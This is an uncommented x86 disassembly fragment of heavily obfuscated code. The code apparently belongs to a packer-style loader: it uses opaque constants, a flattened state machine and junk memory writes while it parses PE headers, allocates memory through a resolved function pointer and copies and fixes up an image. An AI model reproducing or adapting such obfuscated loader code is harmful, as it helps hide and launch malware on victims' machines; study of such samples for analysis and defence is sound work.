  427d2c:	mov    edx,DWORD PTR [ebp-0x4]
  427d2f:	xor    ecx,edx
  427d31:	mov    DWORD PTR [ebp-0x8],ecx
  427d34:	mov    ecx,DWORD PTR [ebp-0xc]
  427d37:	xor    ecx,esi
  427d39:	lea    eax,[eax+ecx*1+0x3272ec]
  427d40:	mov    DWORD PTR [ebp+0x8],eax
  427d43:	mov    eax,DWORD PTR [ebp-0xc]
  427d46:	xor    eax,esi
  427d48:	mov    ecx,0xffcd8d14
  427d4d:	sub    ecx,eax
  427d4f:	add    ecx,DWORD PTR [ebp-0x10]
  427d52:	mov    DWORD PTR [ebp-0x10],ecx
  427d55:	mov    eax,DWORD PTR [ebp-0x14]
  427d58:	mov    ecx,DWORD PTR [ebp-0x10]
  427d5b:	xor    eax,esi
  427d5d:	add    eax,edi
  427d5f:	cmp    ecx,eax
  427d61:	jne    0x427cf4
  427d63:	mov    eax,DWORD PTR [ebp-0x1c]
  427d66:	mov    ecx,DWORD PTR [ebp-0x8]
  427d69:	xor    eax,esi
  427d6b:	add    eax,edi
  427d6d:	pop    edi
  427d6e:	pop    esi
  427d6f:	xor    eax,ecx
  427d71:	pop    ebx
  427d72:	leave  
  427d73:	ret    0x4
  427d76:	push   ebp
  427d77:	mov    ebp,esp
  427d79:	mov    eax,DWORD PTR [ebp+0x1c]
  427d7c:	mov    ecx,DWORD PTR [ebp+0x8]
  427d7f:	mov    edx,DWORD PTR [ebp+0x10]
  427d82:	mov    eax,DWORD PTR [eax+0x190]
  427d88:	mov    eax,DWORD PTR [eax]
  427d8a:	sub    esp,0x64
  427d8d:	push   ebx
  427d8e:	push   esi
  427d8f:	push   edi
  427d90:	mov    edi,0x75108a4
  427d95:	xor    ecx,edi
  427d97:	mov    ebx,0x3272ec
  427d9c:	add    ecx,ebx
  427d9e:	cmp    ecx,edx
  427da0:	jne    0x427db1
  427da2:	or     DWORD PTR ds:0x3750c3e,0x4263eb2f
  427dac:	jmp    0x4282ad
  427db1:	mov    ecx,DWORD PTR [ebp+0x8]
  427db4:	mov    esi,DWORD PTR [ebp+0x14]
  427db7:	mov    edx,DWORD PTR [esi]
  427db9:	xor    ecx,edi
  427dbb:	add    ecx,ebx
  427dbd:	cmp    edx,ecx
  427dbf:	je     0x428268
  427dc5:	mov    ecx,DWORD PTR [ebp+0x1c]
  427dc8:	mov    DWORD PTR [ebp-0x1c],eax
  427dcb:	mov    DWORD PTR [ebp+0x1c],ecx
  427dce:	mov    ecx,DWORD PTR [ebp+0x18]
  427dd1:	mov    eax,DWORD PTR [esi]
  427dd3:	mov    DWORD PTR [ebp-0x20],eax
  427dd6:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  427ddd:	mov    edx,0xf89c85b1
  427de2:	mov    DWORD PTR [ebp-0x8],edx
  427de5:	mov    eax,DWORD PTR [ebp+0x1c]
  427de8:	mov    DWORD PTR [ebp+0x1c],eax
  427deb:	mov    eax,DWORD PTR [ebp+0x1c]
  427dee:	mov    eax,DWORD PTR [eax+0x190]
  427df4:	mov    eax,DWORD PTR [eax]
  427df6:	mov    DWORD PTR [ebp-0x24],ecx
  427df9:	mov    ecx,DWORD PTR [ebp+0x1c]
  427dfc:	mov    ecx,DWORD PTR [ecx+0x190]
  427e02:	mov    ecx,DWORD PTR [ecx]
  427e04:	add    ecx,DWORD PTR [eax+0x3c]
  427e07:	mov    DWORD PTR [ebp+0x10],ecx
  427e0a:	mov    eax,DWORD PTR [ebp+0x8]
  427e0d:	xor    eax,edi
  427e0f:	add    eax,ebx
  427e11:	mov    DWORD PTR [ebp-0x4],eax
  427e14:	mov    eax,DWORD PTR [ebp+0x8]
  427e17:	xor    eax,edi
  427e19:	add    eax,ebx
  427e1b:	mov    DWORD PTR [ebp+0x18],eax
  427e1e:	mov    eax,DWORD PTR [ebp+0x10]
  427e21:	mov    eax,DWORD PTR [eax+0x50]
  427e24:	sub    eax,0xc
  427e27:	mov    DWORD PTR [ebp-0x28],eax
  427e2a:	mov    eax,DWORD PTR [ebp+0x10]
  427e2d:	mov    eax,DWORD PTR [eax+0x38]
  427e30:	mov    ecx,DWORD PTR [ebp+0x10]
  427e33:	dec    eax
  427e34:	test   DWORD PTR [ecx+0x54],eax
  427e37:	mov    eax,DWORD PTR [ebp+0x10]
  427e3a:	je     0x427e54
  427e3c:	mov    eax,DWORD PTR [eax+0x38]
  427e3f:	mov    ecx,DWORD PTR [ebp+0x10]
  427e42:	mov    ecx,DWORD PTR [ecx+0x54]
  427e45:	dec    eax
  427e46:	not    eax
  427e48:	and    ecx,eax
  427e4a:	mov    eax,DWORD PTR [ebp+0x10]
  427e4d:	mov    eax,DWORD PTR [eax+0x38]
  427e50:	add    eax,ecx
  427e52:	jmp    0x427e57
  427e54:	mov    eax,DWORD PTR [eax+0x54]
  427e57:	mov    DWORD PTR [ebp+0x1c],eax
  427e5a:	mov    eax,DWORD PTR [ebp+0x8]
  427e5d:	xor    eax,edi
  427e5f:	add    eax,ebx
  427e61:	mov    DWORD PTR [ebp+0x18],eax
  427e64:	mov    eax,DWORD PTR [ebp+0x8]
  427e67:	xor    eax,edi
  427e69:	add    eax,ebx
  427e6b:	mov    DWORD PTR [ebp+0x18],eax
  427e6e:	mov    eax,DWORD PTR [ebp+0x8]
  427e71:	mov    ecx,DWORD PTR [ebp-0x24]
  427e74:	xor    eax,edi
  427e76:	add    eax,ebx
  427e78:	mov    DWORD PTR [ecx],eax
  427e7a:	mov    DWORD PTR [ebp+0x18],edx
  427e7d:	mov    DWORD PTR [ebp+0x18],0xf89c85b2
  427e84:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  427e8b:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  427e92:	mov    eax,DWORD PTR [ebp-0x8]
  427e95:	mov    ecx,DWORD PTR [ebp+0x1c]
  427e98:	xor    eax,edi
  427e9a:	add    eax,ebx
  427e9c:	imul   eax,ecx
  427e9f:	mov    ecx,DWORD PTR [ebp+0x8]
  427ea2:	mov    edx,DWORD PTR [ebp-0x28]
  427ea5:	xor    ecx,edi
  427ea7:	lea    ecx,[ecx+edx*1+0x3272ec]
  427eae:	cmp    eax,ecx
  427eb0:	jae    0x428261
  427eb6:	mov    eax,DWORD PTR [ebp+0x8]
  427eb9:	xor    eax,edi
  427ebb:	add    eax,ebx
  427ebd:	mov    DWORD PTR [ebp+0x18],eax
  427ec0:	mov    eax,DWORD PTR [ebp+0x1c]
  427ec3:	add    eax,DWORD PTR [ebp-0x1c]
  427ec6:	mov    DWORD PTR [ebp-0x4],eax
  427ec9:	push   DWORD PTR [ebp-0x4]
  427ecc:	mov    esi,DWORD PTR [ebp-0x1c]
  427ecf:	mov    ecx,DWORD PTR [ebp+0x10]
  427ed2:	call   0x427021
  427ed7:	mov    DWORD PTR [ebp+0xc],eax
  427eda:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  427ee1:	mov    eax,DWORD PTR [ebp-0x18]
  427ee4:	xor    eax,edi
  427ee6:	lea    ecx,[ebp-0x40]
  427ee9:	add    eax,ebx
  427eeb:	push   ecx
  427eec:	call   0x4275b5
  427ef1:	mov    eax,DWORD PTR [ebp+0xc]
  427ef4:	test   eax,eax
  427ef6:	je     0x427f46
  427ef8:	mov    eax,DWORD PTR [ebp-0x18]
  427efb:	xor    eax,edi
  427efd:	add    eax,ebx
  427eff:	push   eax
  427f00:	push   DWORD PTR [ebp+0xc]
  427f03:	lea    eax,[ebp-0x40]
  427f06:	push   eax
  427f07:	call   0x4274ab
  427f0c:	mov    eax,DWORD PTR [ebp-0x4]
  427f0f:	mov    DWORD PTR [ebp-0x18],eax
  427f12:	mov    eax,DWORD PTR [ebp-0x18]
  427f15:	mov    ecx,DWORD PTR [ebp-0x1c]
  427f18:	sub    eax,ecx
  427f1a:	mov    DWORD PTR [ebp-0x18],eax
  427f1d:	mov    eax,DWORD PTR [ebp+0xc]
  427f20:	mov    ecx,DWORD PTR [ebp+0xc]
  427f23:	mov    eax,DWORD PTR [eax+0x10]
  427f26:	add    eax,DWORD PTR [ecx+0xc]
  427f29:	mov    ecx,DWORD PTR [ebp-0x18]
  427f2c:	cmp    ecx,eax
  427f2e:	jb     0x427f46
  427f30:	mov    eax,DWORD PTR [ebp+0xc]
  427f33:	mov    eax,DWORD PTR [eax+0xc]
  427f36:	mov    ecx,DWORD PTR [ebp+0xc]
  427f39:	add    eax,DWORD PTR [ecx+0x8]
  427f3c:	mov    ecx,DWORD PTR [ebp-0x18]
  427f3f:	sub    eax,ecx
  427f41:	jmp    0x428234
  427f46:	push   0xc
  427f48:	push   DWORD PTR [ebp-0x4]
  427f4b:	lea    eax,[ebp-0x4c]
  427f4e:	push   eax
  427f4f:	call   0x4274ab
  427f54:	mov    eax,0xf89c85b0
  427f59:	mov    DWORD PTR [ebp-0x2c],eax
  427f5c:	mov    DWORD PTR [ebp-0x30],0xf89c85b1
  427f63:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  427f6a:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  427f71:	lea    ecx,[ebp-0x2c]
  427f74:	mov    DWORD PTR [ebp-0xc],ecx
  427f77:	lea    ecx,[ebp-0x30]
  427f7a:	mov    DWORD PTR [ebp-0x10],ecx
  427f7d:	lea    ecx,[ebp-0x34]
  427f80:	mov    DWORD PTR [ebp+0xc],ecx
  427f83:	lea    ecx,[ebp-0x38]
  427f86:	mov    DWORD PTR [ebp-0x14],ecx
  427f89:	mov    ecx,DWORD PTR [ebp+0x8]
  427f8c:	xor    ecx,edi
  427f8e:	add    ecx,ebx
  427f90:	mov    DWORD PTR [ebp-0x18],ecx
  427f93:	jmp    0x42818f
  427f98:	cmp    eax,0xf89c85b2
  427f9d:	je     0x4281a1
  427fa3:	mov    ecx,DWORD PTR [ebp-0x8]
  427fa6:	xor    ecx,edi
  427fa8:	mov    esi,eax
  427faa:	add    ecx,ebx
  427fac:	mov    DWORD PTR [ebp+0x18],ecx
  427faf:	mov    eax,DWORD PTR [ebp-0x18]
  427fb2:	xor    esi,edi
  427fb4:	lea    eax,[eax+esi*1+0x3272ec]
  427fbb:	mov    DWORD PTR [ebp-0x18],eax
  427fbe:	mov    eax,DWORD PTR [ebp-0x8]
  427fc1:	mov    ecx,DWORD PTR [ebp-0x18]
  427fc4:	xor    eax,edi
  427fc6:	add    eax,ebx
  427fc8:	cmp    ecx,eax
  427fca:	jne    0x427fdf
  427fcc:	mov    eax,DWORD PTR [ebp+0x8]
  427fcf:	xor    eax,edi
  427fd1:	add    eax,ebx
  427fd3:	push   eax
  427fd4:	push   0xc
  427fd6:	lea    eax,[ebp-0x4c]
  427fd9:	push   eax
  427fda:	call   0x427a91
  427fdf:	mov    eax,DWORD PTR [ebp-0xc]
  427fe2:	mov    eax,DWORD PTR [eax]
  427fe4:	xor    eax,edi
  427fe6:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  427fed:	mov    ecx,DWORD PTR [ebp+0x8]
  427ff0:	xor    ecx,edi
  427ff2:	movzx  eax,al
  427ff5:	add    ecx,ebx
  427ff7:	cmp    eax,ecx
  427ff9:	je     0x428177
  427fff:	mov    eax,DWORD PTR [ebp-0x10]
  428002:	mov    eax,DWORD PTR [eax]
  428004:	xor    eax,edi
  428006:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42800d:	mov    ecx,DWORD PTR [ebp+0x8]
  428010:	xor    ecx,edi
  428012:	movzx  eax,al
  428015:	add    ecx,ebx
  428017:	cmp    eax,ecx
  428019:	je     0x428177
  42801f:	mov    eax,DWORD PTR [ebp+0xc]
  428022:	mov    eax,DWORD PTR [eax]
  428024:	xor    eax,edi
  428026:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42802d:	mov    ecx,DWORD PTR [ebp+0x8]
  428030:	xor    ecx,edi
  428032:	movzx  eax,al
  428035:	add    ecx,ebx
  428037:	cmp    eax,ecx
  428039:	je     0x428177
  42803f:	mov    eax,DWORD PTR [ebp-0x14]
  428042:	mov    eax,DWORD PTR [eax]
  428044:	xor    eax,edi
  428046:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42804d:	mov    ecx,DWORD PTR [ebp+0x8]
  428050:	xor    ecx,edi
  428052:	movzx  eax,al
  428055:	add    ecx,ebx
  428057:	cmp    eax,ecx
  428059:	je     0x428177
  42805f:	mov    eax,DWORD PTR [ebp-0x10]
  428062:	mov    eax,DWORD PTR [eax]
  428064:	xor    eax,edi
  428066:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42806d:	mov    ecx,DWORD PTR [ebp-0xc]
  428070:	mov    ecx,DWORD PTR [ecx]
  428072:	xor    ecx,edi
  428074:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42807b:	xor    al,cl
  42807d:	mov    ecx,DWORD PTR [ebp+0xc]
  428080:	mov    ecx,DWORD PTR [ecx]
  428082:	xor    ecx,edi
  428084:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42808b:	or     al,cl
  42808d:	mov    ecx,DWORD PTR [ebp-0xc]
  428090:	mov    ecx,DWORD PTR [ecx]
  428092:	xor    ecx,edi
  428094:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  42809b:	cmp    cl,al
  42809d:	jne    0x428177
  4280a3:	mov    eax,DWORD PTR [ebp+0xc]
  4280a6:	mov    eax,DWORD PTR [eax]
  4280a8:	xor    eax,edi
  4280aa:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4280b1:	mov    ecx,DWORD PTR [ebp-0x10]
  4280b4:	mov    ecx,DWORD PTR [ecx]
  4280b6:	xor    ecx,edi
  4280b8:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4280bf:	xor    al,cl
  4280c1:	mov    ecx,DWORD PTR [ebp-0x14]
  4280c4:	mov    ecx,DWORD PTR [ecx]
  4280c6:	xor    ecx,edi
  4280c8:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4280cf:	or     al,cl
  4280d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4280d4:	mov    ecx,DWORD PTR [ecx]
  4280d6:	xor    ecx,edi
  4280d8:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4280df:	cmp    cl,al
  4280e1:	jne    0x428177
  4280e7:	mov    eax,DWORD PTR [ebp-0x14]
  4280ea:	mov    eax,DWORD PTR [eax]
  4280ec:	xor    eax,edi
  4280ee:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4280f5:	mov    ecx,DWORD PTR [ebp+0xc]
  4280f8:	mov    ecx,DWORD PTR [ecx]
  4280fa:	xor    ecx,edi
  4280fc:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428103:	xor    al,cl
  428105:	mov    ecx,DWORD PTR [ebp-0xc]
  428108:	mov    ecx,DWORD PTR [ecx]
  42810a:	xor    ecx,edi
  42810c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428113:	or     al,cl
  428115:	mov    ecx,DWORD PTR [ebp+0xc]
  428118:	mov    ecx,DWORD PTR [ecx]
  42811a:	xor    ecx,edi
  42811c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  428123:	cmp    cl,al
  428125:	jne    0x428177
  428127:	mov    eax,DWORD PTR [ebp-0x14]
  42812a:	mov    eax,DWORD PTR [eax]
  42812c:	xor    eax,edi
  42812e:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  428135:	mov    ecx,DWORD PTR [ebp-0xc]
  428138:	mov    ecx,DWORD PTR [ecx]
  42813a:	xor    ecx,edi
  42813c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428143:	xor    al,cl
  428145:	mov    ecx,DWORD PTR [ebp-0x10]
  428148:	mov    ecx,DWORD PTR [ecx]
  42814a:	xor    ecx,edi
  42814c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428153:	or     al,cl
  428155:	mov    ecx,DWORD PTR [ebp-0x14]
  428158:	mov    ecx,DWORD PTR [ecx]
  42815a:	xor    ecx,edi
  42815c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  428163:	cmp    cl,al
  428165:	jne    0x428177
  428167:	lea    eax,[ebp-0x4c]
  42816a:	push   eax
  42816b:	call   0x427c32
  428170:	mov    ecx,DWORD PTR [ebp-0x44]
  428173:	cmp    eax,ecx
  428175:	je     0x428181
  428177:	mov    eax,DWORD PTR [ebp+0x8]
  42817a:	xor    eax,edi
  42817c:	add    eax,ebx
  42817e:	mov    DWORD PTR [ebp+0x18],eax
  428181:	mov    eax,DWORD PTR [ebp-0x8]
  428184:	xor    eax,edi
  428186:	lea    eax,[eax+esi*1+0x3272ec]
  42818d:	xor    eax,edi
  42818f:	mov    ecx,DWORD PTR [ebp+0x8]
  428192:	mov    edx,DWORD PTR [ebp+0x18]
  428195:	xor    ecx,edi
  428197:	add    ecx,ebx
  428199:	cmp    edx,ecx
  42819b:	je     0x427f98
  4281a1:	mov    eax,DWORD PTR [ebp+0x8]
  4281a4:	mov    ecx,DWORD PTR [ebp+0x18]
  4281a7:	xor    eax,edi
  4281a9:	add    eax,ebx
  4281ab:	cmp    ecx,eax
  4281ad:	jne    0x4281c0
  4281af:	mov    eax,DWORD PTR [ebp-0x8]
  4281b2:	mov    ecx,DWORD PTR [ebp+0x1c]
  4281b5:	xor    eax,edi
  4281b7:	lea    eax,[eax+ecx*1+0x3272ec]
  4281be:	jmp    0x428237
  4281c0:	push   0x18
  4281c2:	push   DWORD PTR [ebp-0x4]
  4281c5:	lea    eax,[ebp-0x64]
  4281c8:	push   eax
  4281c9:	call   0x4274ab
  4281ce:	mov    eax,DWORD PTR [ebp+0x8]
  4281d1:	mov    ecx,DWORD PTR [ebp-0x18]
  4281d4:	xor    eax,edi
  4281d6:	add    eax,ebx
  4281d8:	cmp    eax,ecx
  4281da:	je     0x4281ef
  4281dc:	mov    eax,DWORD PTR [ebp+0x8]
  4281df:	xor    eax,edi
  4281e1:	add    eax,ebx
  4281e3:	push   eax
  4281e4:	push   0x18
  4281e6:	lea    eax,[ebp-0x64]
  4281e9:	push   eax
  4281ea:	call   0x427a91
  4281ef:	mov    eax,DWORD PTR [ebp-0x4]
  4281f2:	add    eax,0x18
  4281f5:	mov    DWORD PTR [ebp+0x18],eax
  4281f8:	push   DWORD PTR [ebp-0x50]
  4281fb:	push   DWORD PTR [ebp+0x18]
  4281fe:	mov    eax,DWORD PTR [ebp-0x54]
  428201:	add    eax,DWORD PTR [ebp-0x20]
  428204:	push   eax
  428205:	call   0x4274ab
  42820a:	mov    eax,DWORD PTR [ebp+0x8]
  42820d:	mov    ecx,DWORD PTR [ebp-0x18]
  428210:	xor    eax,edi
  428212:	add    eax,ebx
  428214:	cmp    eax,ecx
  428216:	je     0x428229
  428218:	push   0x0
  42821a:	push   DWORD PTR [ebp-0x50]
  42821d:	mov    eax,DWORD PTR [ebp-0x54]
  428220:	add    eax,DWORD PTR [ebp-0x20]
  428223:	push   eax
  428224:	call   0x427a91
  428229:	mov    eax,DWORD PTR [ebp-0x24]
  42822c:	mov    ecx,DWORD PTR [ebp-0x50]
  42822f:	add    DWORD PTR [eax],ecx
  428231:	mov    eax,DWORD PTR [ebp-0x50]
  428234:	add    eax,DWORD PTR [ebp+0x1c]
  428237:	mov    DWORD PTR [ebp+0x1c],eax
  42823a:	mov    eax,DWORD PTR [ebp-0x8]
  42823d:	mov    ecx,DWORD PTR [ebp+0x1c]
  428240:	xor    eax,edi
  428242:	add    eax,ebx
  428244:	imul   eax,ecx
  428247:	mov    ecx,DWORD PTR [ebp+0x8]
  42824a:	mov    edx,DWORD PTR [ebp-0x28]
  42824d:	xor    ecx,edi
  42824f:	lea    ecx,[ecx+edx*1+0x3272ec]
  428256:	cmp    eax,ecx
  428258:	jb     0x427eb6
  42825e:	mov    esi,DWORD PTR [ebp+0x14]
  428261:	mov    eax,DWORD PTR [ebp-0x20]
  428264:	mov    DWORD PTR [esi],eax
  428266:	jmp    0x4282ad
  428268:	mov    ecx,DWORD PTR [ebp+0x8]
  42826b:	mov    edx,DWORD PTR [ebp+0xc]
  42826e:	xor    ecx,edi
  428270:	xor    edx,edi
  428272:	add    ecx,ebx
  428274:	add    edx,ebx
  428276:	cmp    ecx,edx
  428278:	jne    0x42828c
  42827a:	mov    eax,ds:0x7f642ddf
  42827f:	imul   eax,eax,0x9f15fcce
  428285:	mov    ds:0x7f642ddf,eax
  42828a:	jmp    0x4282ad
  42828c:	mov    ecx,DWORD PTR [ebp+0x8]
  42828f:	xor    ecx,edi
  428291:	add    ecx,ebx
  428293:	cmp    eax,ecx
  428295:	je     0x4282a3
  428297:	sub    DWORD PTR ds:0xf861e3f,0x709beac1
  4282a1:	jmp    0x4282ad
  4282a3:	and    DWORD PTR ds:0x3343fadf,0x5265ec3e
  4282ad:	pop    edi
  4282ae:	pop    esi
  4282af:	pop    ebx
  4282b0:	leave  
  4282b1:	ret    0x18
  4282b4:	push   ebp
  4282b5:	mov    ebp,esp
  4282b7:	and    esp,0xfffffff8
  4282ba:	mov    eax,DWORD PTR [ebp+0x20]
  4282bd:	sub    esp,0x14
  4282c0:	push   ebx
  4282c1:	mov    ebx,DWORD PTR [ebp+0x14]
  4282c4:	push   esi
  4282c5:	push   edi
  4282c6:	cmp    eax,0xf89c85b0
  4282cb:	jne    0x4282d7
  4282cd:	push   0xf89c85b1
  4282d2:	jmp    0x428409
  4282d7:	mov    eax,DWORD PTR [ebp+0x20]
  4282da:	cmp    eax,0xf89c85b1
  4282df:	jne    0x4282eb
  4282e1:	push   0xf89c85b2
  4282e6:	jmp    0x428409
  4282eb:	mov    eax,DWORD PTR [ebp+0x20]
  4282ee:	cmp    eax,0xf89c85b2
  4282f3:	jne    0x4282ff
  4282f5:	push   0xf89c85b3
  4282fa:	jmp    0x428409
  4282ff:	mov    eax,DWORD PTR [ebp+0x20]
  428302:	cmp    eax,0xf89c85b3
  428307:	jne    0x428313
  428309:	push   0xf89c85bc
  42830e:	jmp    0x428409
  428313:	mov    ecx,DWORD PTR [ebp+0x20]
  428316:	mov    eax,0xf89c85bf
  42831b:	cmp    ecx,eax
  42831d:	jne    0x4283d9
  428323:	mov    eax,DWORD PTR [ebp+0x10]
  428326:	mov    DWORD PTR [esp+0xc],eax
  42832a:	mov    eax,DWORD PTR [ebp+0x18]
  42832d:	mov    DWORD PTR [esp+0x14],eax
  428331:	mov    eax,DWORD PTR [ebp+0xc]
  428334:	mov    DWORD PTR [esp+0x18],eax
  428338:	mov    eax,DWORD PTR [ebp+0x8]
  42833b:	mov    DWORD PTR [esp+0x10],eax
  42833f:	mov    eax,DWORD PTR [esp+0x10]
  428343:	mov    ecx,DWORD PTR [esp+0x14]
  428347:	mov    edi,0x75108a4
  42834c:	xor    eax,edi
  42834e:	mov    esi,0x3272ec
  428353:	add    eax,esi
  428355:	mov    DWORD PTR [ecx],eax
  428357:	mov    eax,DWORD PTR [esp+0xc]
  42835b:	mov    eax,DWORD PTR [eax+0x194]
  428361:	mov    ecx,DWORD PTR [eax]
  428363:	mov    eax,DWORD PTR [esp+0xc]
  428367:	mov    eax,DWORD PTR [eax+0x194]
  42836d:	mov    eax,DWORD PTR [eax]
  42836f:	add    eax,DWORD PTR [ecx+0x3c]
  428372:	mov    ecx,DWORD PTR [esp+0xc]
  428376:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42837c:	mov    ecx,DWORD PTR [ecx+0x14]
  42837f:	push   0x4
  428381:	push   0x3000
  428386:	push   DWORD PTR [eax+0x50]
  428389:	push   0x0
  42838b:	call   ecx
  42838d:	mov    DWORD PTR [ebx],eax
  42838f:	mov    eax,DWORD PTR [esp+0x10]
  428393:	push   DWORD PTR [esp+0xc]
  428397:	xor    eax,edi
  428399:	add    eax,esi
  42839b:	mov    DWORD PTR [esp+0x20],eax
  42839f:	lea    eax,[esp+0x20]
  4283a3:	push   eax
  4283a4:	push   ebx
  4283a5:	push   DWORD PTR [esp+0x20]
  4283a9:	push   DWORD PTR [esp+0x28]
  4283ad:	push   DWORD PTR [esp+0x24]
  4283b1:	call   0x427d76
  4283b6:	mov    eax,DWORD PTR [esp+0x10]
  4283ba:	mov    ecx,DWORD PTR [ebx]
  4283bc:	xor    eax,edi
  4283be:	add    eax,esi
  4283c0:	cmp    ecx,eax
  4283c2:	je     0x428420
  4283c4:	mov    eax,DWORD PTR [esp+0x18]
  4283c8:	mov    ecx,DWORD PTR [esp+0x14]
  4283cc:	xor    eax,edi
  4283ce:	add    eax,esi
  4283d0:	imul   eax,DWORD PTR [esp+0x1c]
  4283d5:	mov    DWORD PTR [ecx],eax
  4283d7:	jmp    0x428420
  4283d9:	mov    ecx,DWORD PTR [ebp+0x20]
  4283dc:	cmp    ecx,0xf89c85bc
  4283e2:	jne    0x4283eb
  4283e4:	push   0xf89c85bd
  4283e9:	jmp    0x428409
  4283eb:	mov    ecx,DWORD PTR [ebp+0x20]
  4283ee:	cmp    ecx,0xf89c85bd
  4283f4:	jne    0x4283fd
  4283f6:	push   0xf89c85be
  4283fb:	jmp    0x428409
  4283fd:	mov    ecx,DWORD PTR [ebp+0x20]
  428400:	cmp    ecx,0xf89c85be
  428406:	jne    0x428420
  428408:	push   eax
  428409:	push   DWORD PTR [ebp+0x1c]
  42840c:	push   DWORD PTR [ebp+0x18]
  42840f:	push   ebx
  428410:	push   DWORD PTR [ebp+0x10]
  428413:	push   DWORD PTR [ebp+0xc]
  428416:	push   DWORD PTR [ebp+0x8]
  428419:	call   0x4282b4
  42841e:	mov    DWORD PTR [ebx],eax
  428420:	mov    eax,DWORD PTR [ebx]
  428422:	pop    edi
  428423:	pop    esi
  428424:	pop    ebx
  428425:	mov    esp,ebp
  428427:	pop    ebp
  428428:	ret    0x1c
  42842b:	push   ebp
  42842c:	mov    ebp,esp
  42842e:	sub    esp,0xc
  428431:	mov    eax,0xf89c85b0
  428436:	mov    DWORD PTR [ebp-0x8],eax
  428439:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  428440:	mov    ecx,DWORD PTR [ebp-0x8]
  428443:	xor    ecx,0x75108a4
  428449:	add    ecx,0x3272ec
  42844f:	mov    DWORD PTR [ebp-0x4],ecx
  428452:	mov    ecx,DWORD PTR [ebp+0xc]
  428455:	push   eax
  428456:	mov    DWORD PTR [ebp+0xc],ecx
  428459:	push   DWORD PTR [ebp+0xc]
  42845c:	lea    eax,[ebp-0x4]
  42845f:	push   DWORD PTR [ebp+0x8]
  428462:	push   eax
  428463:	push   DWORD PTR [ebp+0xc]
  428466:	push   DWORD PTR [ebp-0xc]
  428469:	push   DWORD PTR [ebp-0x8]
  42846c:	call   0x4282b4
  428471:	mov    DWORD PTR [ebp-0x4],eax
  428474:	mov    eax,DWORD PTR [ebp-0x4]
  428477:	leave  
  428478:	ret    0x8
